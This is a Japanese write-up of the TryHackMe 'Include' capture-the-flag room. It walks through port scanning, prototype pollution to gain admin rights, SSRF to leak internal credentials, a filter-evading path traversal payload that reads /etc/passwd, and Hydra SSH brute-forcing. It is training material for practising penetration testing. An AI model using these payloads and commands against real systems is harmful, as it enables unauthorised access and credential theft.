# Include CTF

https://tryhackme.com/r/room/include

## Enumeration

### ポートスキャン

```shell
TARGET=10.10.139.95
sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-01-08 00:14 GMT
Nmap scan report for 10.10.139.95
Host is up (0.0064s latency).
Not shown: 65527 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
25/tcp    open  smtp
110/tcp   open  pop3
143/tcp   open  imap
993/tcp   open  imaps
995/tcp   open  pop3s
4000/tcp  open  remoteanything
50000/tcp open  ibm-db2
MAC Address: 02:0C:CC:EC:16:61 (Unknown)

sudo nmap -sV -p22,25,110,143,993,995,4000,50000 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-01-08 00:15 GMT
Nmap scan report for 10.10.139.95
Host is up (0.00022s latency).

PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
25/tcp    open  smtp     Postfix smtpd
110/tcp   open  pop3     Dovecot pop3d
143/tcp   open  imap     Dovecot imapd (Ubuntu)
993/tcp   open  ssl/imap Dovecot imapd (Ubuntu)
995/tcp   open  ssl/pop3 Dovecot pop3d
4000/tcp  open  http     Node.js (Express middleware)
50000/tcp open  http     Apache httpd 2.4.41 ((Ubuntu))
MAC Address: 02:0C:CC:EC:16:61 (Unknown)
Service Info: Host:  mail.filepath.lab; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

4000: ログインページ（ユーザー名、パスワード）  
50000: System Monitoring Portal  
それと、SSH、メール送受信

### gobuster

4000

```shell
gobuster dir -u http://$TARGET:4000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.139.95:4000
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index                (Status: 302) [Size: 29] [--> /signin]
/images               (Status: 301) [Size: 179] [--> /images/]
/signup               (Status: 500) [Size: 1246]
/Index                (Status: 302) [Size: 29] [--> /signin]
/signin               (Status: 200) [Size: 1295]
/fonts                (Status: 301) [Size: 177] [--> /fonts/]
/INDEX                (Status: 302) [Size: 29] [--> /signin]
/Signup               (Status: 500) [Size: 1246]
/SignUp               (Status: 500) [Size: 1246]
/signUp               (Status: 500) [Size: 1246]
/SignIn               (Status: 200) [Size: 1295]
Progress: 220557 / 220558 (100.00%)
===============================================================
Finished
===============================================================
```

50000

```shell
gobuster dir -u http://$TARGET:50000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.139.95:50000
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/templates            (Status: 301) [Size: 325] [--> http://10.10.139.95:50000/templates/]
/uploads              (Status: 301) [Size: 323] [--> http://10.10.139.95:50000/uploads/]
/javascript           (Status: 301) [Size: 326] [--> http://10.10.139.95:50000/javascript/]
/phpmyadmin           (Status: 403) [Size: 280]
/server-status        (Status: 403) [Size: 280]
Progress: 220557 / 220558 (100.00%)
===============================================================
Finished
===============================================================
```

## 4000 ポート（ログイン画面）

認証を適当に入れたときの表示

```text
Incorrect name or password
```

### ログインバイパス SQLi

認証のバイパスパターンリストと Intruder を使ってバイパスを試みる。

https://github.com/payloadbox/sql-injection-payload-list/raw/refs/heads/master/Intruder/exploit/Auth_Bypass.txt

```http
POST /signin HTTP/1.1
Host: 10.10.139.95:4000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 21
Origin: http://10.10.139.95:4000
Connection: keep-alive
Referer: http://10.10.139.95:4000/
Cookie: connect.sid=s%3Ag3DvdlRAqfqdNsLgsGj-yUOmqe9meLvO.zDiNZ57QDp8u9IKRY4B%2FBT4DGA9NjPvEx2L%2F4qO1cQg; PHPSESSID=d8tgpk1i17um3hh8mf8sfbkjfb
Upgrade-Insecure-Requests: 1

name=§aaa§&password=bbb
```

ヒットせず。  
よく見たら、画面に guest/guest でログインしろと書いてありログインできた・・・

### isAdmin

```text
Activity Type: isAdmin
Activity Name: true
```

を入力したら管理者用の画面表示になった。プロトタイプ汚染攻撃。

#### API タブ

```text
API Dashboard

Below is a list of important APIs accessible to admins with sample requests and responses:

    Internal API

    GET http://127.0.0.1:5000/internal-api HTTP/1.1
    Host: 127.0.0.1:5000

    Response:
    {
      "secretKey": "superSecretKey123",
      "confidentialInfo": "This is very confidential."
    }

    Get Admins API

    GET http://127.0.0.1:5000/getAllAdmins101099991 HTTP/1.1
    Host: 127.0.0.1:5000

    Response:
    {
        "ReviewAppUsername": "admin",
        "ReviewAppPassword": "xxxxxx",
        "SysMonAppUsername": "administrator",
        "SysMonAppPassword": "xxxxxxxxx",
    }
```

#### Settings タブ

バナー画像の URL を設定できる。API タブの内容を踏まえると SSRF だろう。

http://127.0.0.1:5000/internal-api を入力すると、すぐにその URL から取得され、データが表示される。

```text
data:application/json; charset=utf-8;base64,eyJzZWNyZXRLZXkiOiJzdXBlclNlY3JldEtleTEyMyIsImNvbmZpZGVudGlhbEluZm8iOiJUaGlzIGlzIHZlcnkgY29uZmlkZW50aWFsIGluZm9ybWF0aW9uLiBIYW5kbGUgd2l0aCBjYXJlLiJ9
↓
{"secretKey":"superSecretKey123","confidentialInfo":"This is very confidential information. Handle with care."}
```

同様に http://127.0.0.1:5000/getAllAdmins101099991 を入力

```text
data:application/json; charset=utf-8;base64,eyJSZXZpZXdBcHBVc2VybmFtZSI6ImFkbWluIiwiUmV2aWV3QXBwUGFzc3dvcmQiOiJhZG1pbkAhISEiLCJTeXNNb25BcHBVc2VybmFtZSI6ImFkbWluaXN0cmF0b3IiLCJTeXNNb25BcHBQYXNzd29yZCI6IlMkOSRxazZkIyoqTFFVIn0=
↓
{"ReviewAppUsername":"admin","ReviewAppPassword":"admin@!!!","SysMonAppUsername":"administrator","SysMonAppPassword":"S$9$qk6d#**LQU"}
```

管理者の認証情報をゲット。

```text
admin / admin@!!!
administrator / S$9$qk6d#**LQU
```

4000 ポートのログイン画面ではどっちもログインできない。  
SSH でも POP3 でもログインできない。  
この認証情報は何？

```shell
openssl s_client -quiet -connect 10.10.139.95:995
Connecting to 10.10.139.95
Can't use SSL_get_servername
depth=0 CN=ip-10-10-31-82.eu-west-1.compute.internal
verify error:num=18:self-signed certificate
verify return:1
depth=0 CN=ip-10-10-31-82.eu-west-1.compute.internal
verify return:1
+OK Dovecot (Ubuntu) ready.
USER admin
+OK
PASS admin@!!!
-ERR [AUTH] Authentication failed.
USER administrator
+OK
PASS S$9$qk6d#**LQU
-ERR [AUTH] Authentication failed.
```

## 50000 ポート（SystemMonitor）

下記でログインできた。フラグ１ゲット。

```text
administrator / S$9$qk6d#**LQU
```

### gobuster

```shell
root@ip-10-10-165-220:~# gobuster -x=txt,php dir -u http://$TARGET:50000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.139.95:50000
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 280]
/login.php            (Status: 200) [Size: 2044]
/templates            (Status: 301) [Size: 325] [--> http://10.10.139.95:50000/templates/]
/profile.php          (Status: 302) [Size: 0] [--> login.php]
/uploads              (Status: 301) [Size: 323] [--> http://10.10.139.95:50000/uploads/]
/index.php            (Status: 200) [Size: 1611]
/api.php              (Status: 500) [Size: 0]
/javascript           (Status: 301) [Size: 326] [--> http://10.10.139.95:50000/javascript/]
/logout.php           (Status: 302) [Size: 0] [--> index.php]
/auth.php             (Status: 200) [Size: 0]
/dashboard.php        (Status: 302) [Size: 1225] [--> login.php]
/phpmyadmin           (Status: 403) [Size: 280]
/.php                 (Status: 403) [Size: 280]
/server-status        (Status: 403) [Size: 280]
Progress: 661671 / 661674 (100.00%)
===============================================================
Finished
===============================================================
```

profile.php は「No data received.」と表示される。  
/auth.php, /api.php は空白表示。  
/uploads にプロフィール画像（profile.png）が入っている。

profile.php でリバースシェルをアップロードできるのではないかと予想。

### profile.php

http://10.10.139.95:50000/profile.php?img=aa

とすると、「No data received.」が表示されなくなる。

dashboard 画面で次のように参照されている。  
uploads/$img のような形でコンテンツを読んでいると思われる。

```html
<img
  src="profile.php?img=profile.png"
  class="img-fluid rounded-circle mb-3 profile-pic"
  alt="User Profile Picture"
/>
```

#### パストラバーサル

uploads のパスが/var/www/html/uploads であるとして、 ../../../../etc/passwd を読みたい。

http://10.10.139.95:50000/profile.php?img=../profile.png → 表示される  
http://10.10.139.95:50000/profile.php?img=....//profile.png → 表示される  
http://10.10.139.95:50000/profile.php?img=......///profile.png → 表示されない

ことから、....../// は効果があることが分かった。

http://10.10.139.95:50000/profile.php?img=......///......///......///......///etc/passwd

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
landscape:x:110:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:111:1::/var/cache/pollinate:/bin/false
ec2-instance-connect:x:112:65534::/nonexistent:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
tryhackme:x:1001:1001:,,,:/home/tryhackme:/bin/bash
mysql:x:113:119:MySQL Server,,,:/nonexistent:/bin/false
postfix:x:114:121::/var/spool/postfix:/usr/sbin/nologin
dovecot:x:115:123:Dovecot mail server,,,:/usr/lib/dovecot:/usr/sbin/nologin
dovenull:x:116:124:Dovecot login user,,,:/nonexistent:/usr/sbin/nologin
joshua:x:1002:1002:,,,:/home/joshua:/bin/bash
charles:x:1003:1003:,,,:/home/charles:/bin/bash
```

joshua, charles ユーザーが存在することが分かった。
SSH か POP3 か？

## SSH

```shell
hydra -l joshua -P /usr/share/wordlists/rockyou.txt 10.10.139.95 ssh -t 30
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-07 22:02:52
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 30 tasks per 1 server, overall 30 tasks, 14344399 login tries (l:1/p:14344399), ~478147 tries per task
[DATA] attacking ssh://10.10.139.95:22/
[22][ssh] host: 10.10.139.95   login: joshua   password: 123456
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 10 final worker threads did not complete until end.
[ERROR] 10 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-01-07 22:03:12
```

```shell
hydra -l charles -P /usr/share/wordlists/rockyou.txt 10.10.139.95 ssh -t 30
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-07 22:03:53
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 30 tasks per 1 server, overall 30 tasks, 14344399 login tries (l:1/p:14344399), ~478147 tries per task
[DATA] attacking ssh://10.10.139.95:22/
[22][ssh] host: 10.10.139.95   login: charles   password: 123456
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 5 final worker threads did not complete until end.
[ERROR] 5 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-01-07 22:04:12
```

両方とも一瞬で割れた。

```text
joshua / 123456
charles / 123456
```

/var/www/html に隠しファイルがあることが問題文で明かされているので直接

```shell
joshua@filepath:~$ ls -al /var/www/html
total 52
drwxr-xr-x 4 ubuntu ubuntu 4096 Mar 12  2024 .
drwxr-xr-x 3 root   root   4096 Nov 10  2021 ..
-rw-rw-r-- 1 ubuntu ubuntu  351 Feb 21  2024 .htaccess
-rw-rw-r-- 1 ubuntu ubuntu   38 Feb 22  2024 505eb0fb8a9f32853b4d955e1f9123ea.txt
-rw-rw-r-- 1 ubuntu ubuntu  257 Feb 23  2023 api.php
-rw-rw-r-- 1 ubuntu ubuntu  932 Feb 26  2024 auth.php
-rw-rw-r-- 1 ubuntu ubuntu 3504 Feb 21  2024 dashboard.php
-rw-rw-r-- 1 ubuntu ubuntu  429 Feb 21  2024 index.php
-rw-rw-r-- 1 ubuntu ubuntu 1000 Feb 20  2024 login.php
-rw-rw-r-- 1 ubuntu ubuntu   81 Nov  5  2023 logout.php
-rw-rw-r-- 1 ubuntu ubuntu  444 Mar 12  2024 profile.php
drwxrwxr-x 2 ubuntu ubuntu 4096 Mar 12  2024 templates
drwxrwxr-x 2 ubuntu ubuntu 4096 Feb 20  2024 uploads
joshua@filepath:~$ cat /var/www/html/505eb0fb8a9f32853b4d955e1f9123ea.txt
THM{}
```

フラグ 2 ゲット

## 振り返り

- メールサーバーは罠
- admin / admin@!!! の認証情報が結局なんだったのかは不明なまま
- ../ がフィルターで削除されるタイプのファイルトラバーサルは、正常形で動作しているパスに少しずつ追加していくと理解しやすいというコツをつかめた
